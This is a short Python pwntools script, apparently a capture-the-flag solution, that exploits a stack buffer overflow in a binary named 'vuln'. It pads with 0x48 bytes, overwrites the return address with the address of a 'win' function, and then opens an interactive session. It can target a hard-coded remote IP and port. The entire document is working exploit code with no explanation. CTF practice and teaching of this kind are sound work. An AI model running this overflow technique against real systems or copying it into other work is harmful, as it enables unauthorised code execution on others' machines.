#!/usr/bin/env python3
from pwn import *

PORT =  11347
HOST = "51.79.140.18"
elf = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

pl = b'A'*0x48  + p64(elf.sym.win)
p.sendlineafter(b"> ", pl)

p.interactive()